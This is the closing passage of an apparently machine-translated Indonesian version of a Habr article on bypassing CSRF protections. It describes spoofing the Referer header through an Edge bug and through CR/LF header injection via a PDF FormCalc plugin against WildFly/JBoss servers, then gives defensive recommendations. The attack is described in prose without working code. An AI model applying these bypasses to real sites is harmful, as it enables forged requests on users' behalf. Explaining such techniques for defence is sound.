Maka akan berhasil. <br><br>  <strong>8. Perujuk Spoof</strong> <br><br>  Opsi terakhir untuk memintas perlindungan CSRF didasarkan pada Referer.  Ada <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">bug di</a> peramban <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Microsoft Edge</a> , yang masih belum diperbaiki dan memungkinkan Anda untuk memalsukan nilai Referer.  Tapi sayangnya, itu hanya berfungsi untuk permintaan GET.  Jika backend yang diserang tidak membedakan GET dari POST, maka bug ini dapat dieksploitasi. <br><br>  Jika kita masih membutuhkan POST, maka ada sedikit trik.  Kami dapat mengirim pengarah header menggunakan plugin PDF dan FormCalc. <br><img src="https://habrastorage.org/webt/yu/iu/vw/yuiuvwwn-xj4llbso7bhkscb7nc.jpeg"><br><br>  Sekitar setahun yang lalu dimungkinkan menggunakan plug-in PDF untuk mengirim header secara umum, termasuk host, tetapi kemudian Adobe menutup kemungkinan ini dengan membuat daftar hitam header.  Artinya, jika kita menentukan Referer di header, maka header ini tidak akan pergi. <br><br>  Secara umum, FormCalc memungkinkan kami untuk secara sah mengirimkan Jenis Konten apa pun.  Jika kami menyisipkan karbur balik dan karakter umpan baris, kami dapat menambahkan tajuk tambahan ke permintaan. <br><br>  Apa yang terjadi jika kami menerapkan header <code>Referer http://example.com</code> ? <br><br>  Jelas bahwa itu tidak ada dalam daftar hitam dan header dengan nama <code>Referer http://example.com</code> akan dikirim ke backend. <br><br>  Beberapa server, seperti WildFly atau Jboss, memperlakukan <strong>ruang</strong> sebagai akhir nama header HTTP, yaitu titik dua ` <strong>:</strong> `.  Dengan demikian, server tersebut akan melihat bahwa Referer datang kepada mereka dengan nilai <code>http://example.com</code> .  Jadi kami akan mengganti Referer. <br><img src="https://habrastorage.org/webt/mb/7x/gu/mb7xgu42xmzrfmrgiane0pb_zck.jpeg"><br><br>  Ini adalah tabel ringkasan.  Kolom memberikan perlindungan terhadap CSRF, dan baris memberikan solusi.  Di setiap sel, browser tempat metode ini bekerja ditunjukkan: <br><br><ul><li>  Semua sarana untuk semua browser; <br></li><li>  Semua * berarti browser yang tidak mendukung SameSite Cookies, mis.  Semuanya kecuali Chrome dan Opera. <br></li></ul><br><img src="https://habrastorage.org/webt/e7/pg/-v/e7pg-vuidm5muwr1cifi0hthawu.jpeg"><br><br>  Opsi yang paling penting dan berfungsi untuk melindungi dari serangan CSRF adalah menyingkirkan cookie dan menggunakan header dengan token. <br><br>  Tetapi jika Anda masih belum siap untuk menyerah cookie untuk mengelola sesi pengguna Anda: <br><br><ul><li>  Model ancaman dan verifikasi penerapan perlindungan CSRF <strong><em>(lihat tabel Ringkasan).</em></strong> <br></li><li>  Terapkan Cookie SameSite.  Sekarang hanya dua browser yang mendukung, tetapi di masa depan, mungkin, akan ada lebih banyak. <br></li><li>  Gabungkan berbagai pertahanan CSRF - pertahanan secara mendalam. <br></li><li>  Minta pengguna kata sandi untuk melakukan tindakan kritis. <br></li><li>  Berikan file yang diunduh oleh pengguna dari domain terpisah. <br></li></ul><br><blockquote>  Dalam waktu kurang dari enam bulan, dan highload berikutnya dalam sebulan - <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Highload ++ Siberia</a> . <br><br>  Kami ingin menarik perhatian Anda ke beberapa laporan yang dipilih: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Saya menangis untuk semua orang!</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Bagaimana kami mengintegrasikan sistem pembayaran tanpa menggunakan penagihan kami sendiri</a> / Anton Rusakov. <br></li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">njs - skrip javascript asli di nginx</a> / Dmitry Volintsev. <br></li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">PG Saga: perubahan data dependen di beberapa layanan tanpa komitmen dua fase dan dependensi sinkron</a> / Konstantin Evteev. <br></li></ul><br></blockquote></div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/id412855/">https://habr.com/ru/post/id412855/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id412845/index.html">Klasifikasi emosi: di jantung komputasi emosional</a></li>
<li><a href="../id412847/index.html">graphql - mengoptimalkan permintaan basis data</a></li>
<li><a href="../id412849/index.html">TOP 8 buku yang layak dibaca musim panas ini</a></li>
<li><a href="../id412851/index.html">OutOfMemory dan GDI + terkadang tidak OutOfMemory sama sekali</a></li>
<li><a href="../id412853/index.html">Video dari Badoo Techleads Meetup # 3: Tentang Delegasi, Onboarding, Bisnis, dan Wawancara TI</a></li>
<li><a href="../id412859/index.html">Otentikasi dua faktor di Windows dan enkripsi data tanpa otoritas dan domain sertifikat</a></li>
<li><a href="../id412861/index.html">Membuat peta jalur pengguna untuk boneka</a></li>
<li><a href="../id412863/index.html">Dialogflower - Google Dialogflow untuk Yandex Alice</a></li>
<li><a href="../id412865/index.html">Cara memotret kamera Motion Eye di Sony Xperia XZ2</a></li>
<li><a href="../id412867/index.html">Cara mengompilasi file DOS COM oleh kompiler GCC</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>